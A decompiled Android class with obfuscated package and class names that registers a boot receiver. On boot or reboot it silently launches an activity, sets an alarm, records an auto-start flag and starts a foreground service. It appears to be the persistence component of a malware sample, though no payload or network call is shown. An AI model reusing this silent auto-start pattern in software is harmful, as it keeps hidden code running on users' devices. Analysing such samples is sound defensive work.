/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package linker.resourcer.encoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.Vtbpdyukd$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.Vwfkyqppf;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;

public class Vtbpdyukd
extends BroadcastReceiver {
    static /* synthetic */ void lambda$onReceive$0(Intent intent, Context context) {
        if (intent.getAction() != null && (intent.getAction() == "android.intent.action.BOOT_COMPLETED" || intent.getAction() == "android.intent.action.REBOOT")) {
            try {
                intent = new Intent(context, Vwfkyqppf.class);
                intent.addFlags(0x10000000);
                intent.addFlags(32768);
                intent.addFlags(0x4000000);
                context.startActivity(intent);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AlarmHelper.setAlarm(context);
        vyklwirattpkwkqagsbrm.WriteBool(context, aaskrfyvhoypymnzlskbzwpyr.AutoStartOn, true);
        intent = new Intent(context, qswemlflptdlumxqnjrlg.class);
        if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, qswemlflptdlumxqnjrlg.class)) {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
    }

    public void onReceive(Context context, Intent intent) {
        new Thread(new Vtbpdyukd$$ExternalSyntheticLambda0(intent, context)).start();
    }
}

